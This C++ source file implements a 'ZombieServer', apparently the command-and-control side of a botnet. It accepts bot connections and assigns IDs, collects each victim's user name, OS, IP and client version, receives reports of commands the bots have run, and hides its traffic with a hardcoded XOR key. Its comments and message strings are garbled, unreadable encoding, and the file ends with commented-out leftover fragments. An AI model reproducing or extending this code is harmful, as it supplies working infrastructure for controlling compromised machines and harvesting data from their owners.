#include "stdafx.h"
#include "Packet.h"
#include "ZombieServer.h"

// �����������
ZombieServer::ZombieServer()
{
	for (int x = 0; x < MAX_CLIENT + 1; x++)
	{
		// �������� ������ ������� �������
		client_socket[x] = 0;
		client_event[x] = 0;
		writeAccess[x] = FALSE;
		numRecv[x] = 0;
		numSend[x] = 0;
		id[x] = 0;
		writeBuffer[x] = (char*)malloc(PACKET_SIZE);
		sizeWriteBuffer[x] = PACKET_SIZE;
		ZeroMemory(recvBuffer, PACKET_SIZE);
	}
	unicID = 1;
	eventTotal = 0;
}

// ����� �������� ������������ ������ (WSAEventSelect)
BOOL ZombieServer::StartServer(HWND hWndPar)
{
	hWnd = hWndPar; // ��������� ����� ����, � ������� ����� ���������� ���������

	SOCKADDR_IN servAddr;				// ����� ��� ���������� � �������
	SOCKET listenSocket;				// ��������� �����
	WSAEVENT newEvent;					// ����� ��������� ������� ��� ���������� � �������

										// ������� ��������� �����
	if ((listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
	{
		MessageBox(NULL, "������ �������� ������!", "������", MB_OK);
		WSACleanup();
		return FALSE;
	}

	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servAddr.sin_port = htons(PORT);

	// ��������� ��������� ����� � �������
	if (bind(listenSocket, (SOCKADDR *)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
	{
		MessageBox(NULL, "������ ����������!", "������", MB_OK);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// ������� ����� �������
	if ((newEvent = WSACreateEvent()) == WSA_INVALID_EVENT)
	{
		MessageBox(NULL, "������ �������� �������!", "������", MB_OK);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// ��������� ������� � ��������� �������
	if (WSAEventSelect(listenSocket, newEvent, FD_ACCEPT | FD_CLOSE) == SOCKET_ERROR)
	{
		MessageBox(NULL, "������ ���������� ������ � ��������!", "������", MB_OK);
		WSACloseEvent(newEvent);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// ��������� ������������� ���������� ������
	if (listen(listenSocket, 1) == SOCKET_ERROR)
	{
		MessageBox(NULL, "������ ��������� �����!", "������", MB_OK);
		WSACloseEvent(newEvent);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// ��������� ����� � ������� � ������
	client_socket[eventTotal] = listenSocket;
	client_event[eventTotal] = newEvent;
	eventTotal = 1;

	// ��������� ����� ��������� �������
	DWORD tPar;
	HANDLE hThread;
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadEvents, this, NULL, &tPar);

	return TRUE;
}

// ����� �������� ��������� �������
BOOL ZombieServer::SendPacket(int indexWait, Packet* packet)
{
	DWORD* uF = 0;
	char bufferSend[PACKET_SIZE];

	uF = (DWORD*)&bufferSend;
	*uF = packet->type;
	uF = (DWORD*)&bufferSend[4];
	*uF = packet->id;
	uF = (DWORD*)&bufferSend[8];
	*uF = packet->id1;
	uF = (DWORD*)&bufferSend[12];
	*uF = packet->id2;

	memcpy(bufferSend + 16, packet->data, PACKET_DATA_SIZE);

	Crypt(bufferSend, PACKET_SIZE);

	if (writeAccess[indexWait] == FALSE)
	{
		// ������ � ������ � ����� ������
		if (sizeWriteBuffer[indexWait] - numSend[indexWait] < PACKET_SIZE)
		{
			// � ������ ��� ����� ��� ������ ������, ����������� �����
			writeBuffer[indexWait] = (char*)realloc(writeBuffer[indexWait], sizeWriteBuffer[indexWait] + PACKET_SIZE);
			sizeWriteBuffer[indexWait] = sizeWriteBuffer[indexWait] + PACKET_SIZE;
		}

		// ����� �� ��������� �����
		memcpy(writeBuffer[indexWait] + numSend[indexWait], bufferSend, PACKET_SIZE);
		numSend[indexWait] = numSend[indexWait] + PACKET_SIZE;
		writeAccess[indexWait] = FALSE;
		return TRUE;
	}
	else if (writeAccess[indexWait] == TRUE)
	{
		// ������ � ������ � ����� ������, ����� � �����
		int iSend = send(client_socket[indexWait], bufferSend, PACKET_SIZE, 0);
		if (iSend == PACKET_SIZE)
		{
			//�������� ������ ������ �������
			numSend[indexWait] = 0;
			return TRUE;
		}
		else if (iSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
		{
			// ����� ������������, ����� �� ��������� �����
			memcpy(writeBuffer[indexWait], bufferSend, PACKET_SIZE);
			numSend[indexWait] = PACKET_SIZE;
			writeAccess[indexWait] = FALSE;
			return TRUE;
		}
		else
		{
			// ������ ������ � �����
			return FALSE;
		}
	}
}

// ���������� ������ �������
BOOL ZombieServer::AcceptClient(DWORD index)
{
	// WSA_MAXIMUM_WAIT_EVENTS - ������������ ����� ��������� �������

	SOCKADDR addrBot; // ��������� ��������� ������ � �������������� ������ (IP �����)

	// ���������� �������
	client_socket[eventTotal] = accept(client_socket[index], &addrBot, NULL);
	if (client_socket[eventTotal] == SOCKET_ERROR)
	{
		// ������
		return FALSE;
	}

	// ������� ������� ��� ������������� ����
	client_event[eventTotal] = WSACreateEvent();

	// ��������� ������� (�����) � ��������
	WSAEventSelect(client_socket[eventTotal], client_event[eventTotal], FD_READ | FD_WRITE | FD_CLOSE);

	id[eventTotal] = unicID;

	// ����������� � ������� ����������
	Packet packet;
	ZeroMemory(packet.data, PACKET_DATA_SIZE);
	packet.type = PACKET_ADD_ID;
	packet.id = id[eventTotal];
	SendPacket(eventTotal, &packet);

	eventTotal++;
	unicID++;
	return TRUE;
}

// ��������� ���������� � ��������
void ZombieServer::CloseClient(DWORD index)
{
	WSAEventSelect(client_socket[index], client_event[index], 0L);
	WSACloseEvent(client_event[index]);
	closesocket(client_socket[index]);

	// �������� ������ � ����
	char IDS[10] = "";
	_itoa_s(id[index], IDS, 10);
	SendMessage(hWnd, WM_CLOSE_CLIENT, (WPARAM)IDS, 0);

	// ������� �����, �������� �������
	for (int x = index; x < eventTotal; x++)
	{
		client_socket[x] = client_socket[x + 1];
		client_event[x] = client_event[x + 1];
		writeAccess[x] = writeAccess[x + 1];
		id[x] = id[x + 1];
		numRecv[x] = numRecv[x + 1];
		numSend[x] = numSend[x + 1];
		memcpy(recvBuffer[x], recvBuffer[x + 1], PACKET_SIZE);
		writeBuffer[x] = writeBuffer[x + 1];
		sizeWriteBuffer[x] = sizeWriteBuffer[x + 1];
	}

	// ��������� ������� ��������
	eventTotal--;

	return;
}

// ���������� ID �������
int ZombieServer::GetID(DWORD indexWait)
{
	return id[indexWait];
}

// ���������� ������ �� ���������� �������
BOOL ZombieServer::WriteClient(DWORD indexWait)
{
	// ������������� ��������� ��������� ������� ��� ������ � �����
	writeAccess[indexWait] = TRUE;

	if (numSend[indexWait] != 0)
	{
		// �� ��������� ������� ���� ������ ��� ��������
		int errSend = send(client_socket[indexWait], writeBuffer[indexWait], numSend[indexWait], 0);
		if (errSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
		{
			// ����� ������������
			writeAccess[indexWait] = FALSE;
			return TRUE;
		}
		else if (errSend != SOCKET_ERROR && errSend == numSend[indexWait])
		{
			writeAccess[indexWait] = TRUE;
			numSend[indexWait] = 0;
			return TRUE;
		}
		else
		{
			return FALSE;
		}
	}
	return TRUE;
}

// ���������� ��������� �������
BOOL ZombieServer::ReadClient(DWORD indexWait)
{
	// ������ ������
	int iResult = recv(client_socket[indexWait], recvBuffer[indexWait] + numRecv[indexWait], PACKET_SIZE - numRecv[indexWait], 0);
	if (iResult == PACKET_SIZE - numRecv[indexWait])
	{
		// ������ ������ ��������� ���������
		numRecv[indexWait] = 0;

		// �������������� ������
		Crypt(recvBuffer[indexWait], PACKET_SIZE);

		Packet pak;
		pak.type = ParsePacketType(recvBuffer[indexWait]);
		pak.id = ParseID(recvBuffer[indexWait]);
		pak.id1 = ParseID1(recvBuffer[indexWait]);
		pak.id2 = ParseID2(recvBuffer[indexWait]);
		memcpy(pak.data, recvBuffer[indexWait] + 16, PACKET_DATA_SIZE);
		WorkData(&pak);
		return TRUE;
	}
	else if (iResult < PACKET_SIZE - numRecv[indexWait])
	{
		// ����� �� ��������� ��������
		numRecv[indexWait] = numRecv[indexWait] + iResult;
		return TRUE;

	}
	else if (iResult == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
	{
		// ����� ������������
		return TRUE;
	}
	else
	{
		// ������
		return FALSE;
	}
}

void ZombieServer::WorkData(Packet* pak)
{
	User user; // ���������� ��� �������� ���������� � ������������ �������

	// ��������� �� ���������� ��������� � ������������ � ����� ������
	switch (pak->type)
	{
	case PACKET_USER_JOINED:

		// ���������� ���������� � ������������ ������� � ����
		ParseUser(pak->data, &user);
		SendMessage(hWnd, WM_JOINED_CLIENT, (WPARAM)&user, 0);
		return;

	case PACKET_CMD_REPORT:

		// ���������� ������ �� ��������� ������
		SendMessage(hWnd, WM_CMD_REPORT, (WPARAM)pak->data, PACKET_DATA_SIZE);
		return;
	}
}

// ��������� ������� �������
DWORD WINAPI ZombieServer::ThreadEvents(LPVOID lpParameter)
{
	ZombieServer* pZomb = (ZombieServer*)lpParameter;	// ��������� �� ���������� ������

	DWORD indexWait;				// ����� ������ � ������� � ������� ��������� �������
	WSANETWORKEVENTS net;			// ������� � ������
	BOOL done = FALSE;				// ��������� ������ �� ����� �������� �������

	while (done == FALSE)
	{
		// ���� ������� �������
		indexWait = WSAWaitForMultipleEvents(pZomb->eventTotal, pZomb->client_event, FALSE, WSA_INFINITE, FALSE);
		if (indexWait == WSA_WAIT_FAILED || indexWait == WSA_WAIT_TIMEOUT)
		{
			break;
		}

		indexWait -= WSA_WAIT_EVENT_0;

		// �������� ����� ������� ���������
		if (WSAEnumNetworkEvents(pZomb->client_socket[indexWait], pZomb->client_event[indexWait], &net) == SOCKET_ERROR)
		{
			// ��������� ������
			if (indexWait == NULL)
			{
				// ������ ��������� �� ���������(���������) ������, ��������� ����� �������
				break;
			}
			else
			{
				// ������ ��������� �� ���������� ������, ��������� �������, ���� ������� ������
				pZomb->CloseClient(indexWait);;
				continue;
			}
		}

		// ������ ������� �����������
		if (net.lNetworkEvents & FD_ACCEPT)
		{
			if (net.iErrorCode[FD_ACCEPT_BIT] != 0 || pZomb->AcceptClient(indexWait) == FALSE)
			{
				// ��������� ������
				break;
			}
		}

		// ���� ������ ��� ������
		if (net.lNetworkEvents & FD_READ)
		{
			if (net.iErrorCode[FD_READ_BIT] != 0 || pZomb->ReadClient(indexWait) == FALSE)
			{
				// ��������� ������
				pZomb->CloseClient(indexWait);
				continue;
			}
		}

		// ����� ������ �������� ��� ������
		if (net.lNetworkEvents & FD_WRITE)
		{
			if (net.iErrorCode[FD_WRITE_BIT] != 0 || pZomb->WriteClient(indexWait) == FALSE)
			{
				// ��������� ������
				pZomb->CloseClient(indexWait);
				continue;
			}
		}

		// ���������� � �������� �������
		if (net.lNetworkEvents & FD_CLOSE)
		{
			if (net.iErrorCode[FD_CLOSE_BIT] != 0)
			{

			}
			pZomb->CloseClient(indexWait);
		}
	}
	ExitProcess(0);
}

// ������� ������ ��������� �����
void ZombieServer::ParseUser(char* data, User* user)
{
	ZeroMemory(user->id, 128);
	ZeroMemory(user->name, 128);
	ZeroMemory(user->os, 128);
	ZeroMemory(user->ip, 128);
	ZeroMemory(user->ver, 128);

	int i = 0;
	int p = 0;
	int count = 0;

	while (data[i] != NULL)
	{
		switch (count)
		{
		case 0: // ID
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->id[p] = data[i];
			p++;
			break;
		case 1: // ��� ������������
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->name[p] = data[i];
			p++;
			break;
		case 2: // OS
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->os[p] = data[i];
			p++;
			break;
		case 3: // IP
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->ip[p] = data[i];
			p++;
			break;
		case 4: // ������ �������
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->ver[p] = data[i];
			p++;
			break;
		}
		i++;
	}

	// ����������� ������������ ������ � ������
	int wsize = MultiByteToWideChar(1251, 0, user->id, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->id, -1, user->wID, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->name, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->name, -1, user->wName, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->os, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->os, -1, user->wOS, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->ip, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->ip, -1, user->wIP, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->ver, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->ver, -1, user->wVer, wsize);

	return;
}

// ����������� ������
void ZombieServer::Crypt(char* cryptData, int sizeCryptData)
{
	const unsigned char key[8] = { 193, 127, 143, 121, 167, 179, 187, 191 }; // ���� ����������
	int iKey = 0;
	char ch;

	for (int i = 0; i < sizeCryptData; i++)
	{
		ch = cryptData[i];
		cryptData[i] = ch ^ key[iKey];
		iKey++;
		iKey %= 8;
	}
	return;
}

DWORD ZombieServer::ParsePacketType(char* data)
{
	char* uR = 0;
	DWORD packetType;

	// ������ ��� ������
	uR = (char*)&packetType;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i];
	}
	return packetType;
}

DWORD ZombieServer::ParseID(char* data)
{
	char* uR = 0;
	DWORD id;

	// ������ ��� ������
	uR = (char*)&id;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 4];
	}
	return id;
}

DWORD ZombieServer::ParseID1(char* data)
{
	char* uR = 0;
	DWORD id1;

	// ������ ��� ������
	uR = (char*)&id1;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 8];
	}
	return id1;
}

DWORD ZombieServer::ParseID2(char* data)
{
	char* uR = 0;
	DWORD id2;

	// ������ ��� ������
	uR = (char*)&id2;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 12];
	}
	return id2;
}

/*

case PACKET_CMD_REPORT:

// ��������� � ������� �� ��������� ������
wchar_t wReportBuffer[4096] = L"";
int wsize = MultiByteToWideChar(1251, 0, zombie.data, -1, 0, 0);
MultiByteToWideChar(1251, 0, zombie.data, -1, wReportBuffer, wsize);
lstrcat(reportBuffer, wReportBuffer);
SetWindowText(hEditView, reportBuffer);
break;

}

return packetType;
}



// ��������� � ������� �� ��������� ������
wchar_t wReportBuffer[4096] = L"";
int wsize = MultiByteToWideChar(1251, 0, zombie.data, -1, 0, 0);
MultiByteToWideChar(1251, 0, zombie.data, -1, wReportBuffer, wsize);
lstrcat(reportBuffer, wReportBuffer);
SetWindowText(hEditView, reportBuffer);
break;







*/

/*	if (writeAccess[indexWait] == FALSE)
{
// ������ � ������ � ����� ������
if (sizeWriteBuffer[indexWait] - numSend[indexWait] < PACKET_SIZE)
{
// � ������ ��� ����� ��� ������ ������, ����������� �����
writeBuffer[indexWait] = (char*)realloc(writeBuffer[indexWait], sizeWriteBuffer[indexWait] + PACKET_SIZE);
sizeWriteBuffer[indexWait] = sizeWriteBuffer[indexWait] + PACKET_SIZE;
}

// ����� �� ��������� �����
memcpy(writeBuffer[indexWait] + numSend[indexWait], bufferSend, PACKET_SIZE);
numSend[indexWait] = numSend[indexWait] + PACKET_SIZE;
writeAccess[indexWait] = FALSE;
return;
}
else if (writeAccess[indexWait] == TRUE)
{
// ������ � ������ � ����� ������, ����� � �����
int iSend = send(client_socket[indexWait], bufferSend, PACKET_SIZE, 0);
if (iSend == SOCKET_ERROR)
{
if (WSAGetLastError() == WSAEWOULDBLOCK)
{
// ������ ������, ����� ������������, ����� �� ��������� �����
memcpy(writeBuffer[indexWait], bufferSend, PACKET_SIZE);
numSend[indexWait] = PACKET_SIZE;
writeAccess[indexWait] = FALSE;
return;
}
else
{
MessageBox(NULL, "����������� ������ send", "����� �� ������ ����", MB_OK);
}
}
else if (iSend != SOCKET_ERROR && iSend < PACKET_SIZE)
{
MessageBox(NULL, "Send ��������� ����� ������", "����� �� ������ ����", MB_OK);
}
else
{
numSend[indexWait] = 0;
}
}
return;
}
*/